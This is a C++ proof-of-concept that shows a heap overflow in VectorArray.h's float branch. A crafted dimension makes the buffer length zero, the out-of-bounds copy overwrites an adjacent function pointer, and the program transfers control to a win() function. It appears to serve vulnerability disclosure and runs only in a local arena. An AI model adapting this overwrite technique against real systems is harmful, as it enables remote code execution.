// C1 — VectorArray float-branch overflow -> CONTROL-FLOW HIJACK (RCE demo)
//
// The overflow in VectorArray.h gives the attacker BOTH the write length (bounded
// only by request size) AND the write content (the float payload bytes, verbatim).
// A code pointer is 8 bytes = 2 floats, so the attacker can overwrite an adjacent
// object's function pointer with ANY 8-byte value.
//
// The vulnerable arithmetic below is verbatim from VectorArray.h:57-70. To make heap
// adjacency deterministic and the hijack observable, allocations come from a tiny bump
// arena instead of the global new[] (the bug is the arithmetic, not the allocator; the
// ASan sibling PoC proves it is a real heap-buffer-overflow against the real new[]).
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

// ---- deterministic arena: hands out adjacent blocks, like a fresh heap top ----
static char   ARENA[4096];
static size_t ARENA_OFF = 0;
static void* arena_alloc(size_t n) { void* p = ARENA + ARENA_OFF; ARENA_OFF += n; return p; }

// ---- the victim: an object placed right after the vulnerable buffer, holding a fn ptr ----
struct Victim { void (*handler)(); };            // a callback the program later invokes
static void legit_handler() { printf("[C1] legit_handler() ran (no hijack)\n"); }
static void win()          { printf("[C1] *** win() executed via hijacked pointer — arbitrary code exec ***\n");
                             printf("[C1]     (a real exploit would exec /bin/sh here)\n"); }

// ---- layout-faithful proto stand-in (same as the ASan PoC) ----
struct FloatVectorProto { std::string bytes;
                          const void* data() const { return bytes.data(); }
                          size_t size() const { return bytes.size(); } };
struct VectorFieldProto { int64_t dim_field; FloatVectorProto fv;
                          int64_t dim() const { return dim_field; }
                          const FloatVectorProto& float_vector() const { return fv; } };

int main() {
    // Heap layout: [ vulnerable float buffer ][ Victim ]  — adjacent.
    // Allocate the victim FIRST so we know its address, then the vulnerable buffer lands
    // just before it (arena hands out ascending addresses -> buffer is BELOW victim).
    // We reserve the buffer slot before the victim so overflow flows forward into it.
    void*  buf_slot = arena_alloc(0);            // remember where buffer will start
    (void)buf_slot;

    // Attacker builds the payload: length chosen so the overflow reaches the fn ptr,
    // content = padding floats + the 8 bytes of &win reinterpreted as 2 floats.
    // Buffer will be new float[0] (length_=0), so EVERY byte of the payload is OOB.
    // We want the 8 bytes of &win to land exactly on Victim::handler.
    // Layout: buffer starts at offset B; Victim starts at offset V = B (since alloc(0)).
    // To keep it simple and robust we place Victim first at a known slot, then compute pad.

    // --- reserve victim at a fixed, known offset ---
    Victim* v = (Victim*)arena_alloc(sizeof(Victim));
    v->handler = legit_handler;

    // --- vulnerable buffer will be allocated by the vuln fn; make it start right before v ---
    // Reset arena so the buffer is placed immediately AFTER v (forward overflow into... nothing),
    // OR immediately BEFORE v. We want forward overflow to hit v, so buffer must be BEFORE v.
    // Rewind and place buffer at ARENA start, victim right after it.
    ARENA_OFF = 0;
    char*  buffer_base = (char*)arena_alloc(64);        // vuln buffer region (>= payload)
    Victim* victim = (Victim*)arena_alloc(sizeof(Victim));
    victim->handler = legit_handler;
    size_t off_to_handler = (char*)&victim->handler - buffer_base;   // bytes from buffer start to fn ptr

    // Attacker payload: `off_to_handler` bytes of padding, then 8 bytes = &win.
    uint64_t win_addr = (uint64_t)(void*)&win;
    std::vector<uint8_t> payload(off_to_handler + 8, 0x41);
    std::memcpy(payload.data() + off_to_handler, &win_addr, 8);      // overwrite fn ptr with &win

    VectorFieldProto req;
    req.dim_field = 1 << 20;                                          // per-row dim -> length_ = 0
    req.fv.bytes.assign((char*)payload.data(), payload.size());

    // ---- verbatim vulnerable arithmetic from VectorArray.h:57-70 (float branch) ----
    int64_t dim_    = req.dim();                                      // :57
    size_t  length_ = req.float_vector().size() / sizeof(float) / dim_;  // :62 -> 0
    float*  data    = (float*)buffer_base;                            // :63 stand-in for new float[length_*dim_]==new float[0]
    (void)length_;
    std::memcpy(data, req.float_vector().data(), req.float_vector().size());  // :66-69 OOB write

    printf("[C1] before call: victim->handler = %p (legit=%p, win=%p)\n",
           (void*)victim->handler, (void*)&legit_handler, (void*)&win);
    victim->handler();                                               // control-flow transfer -> hijacked
    return 0;
}
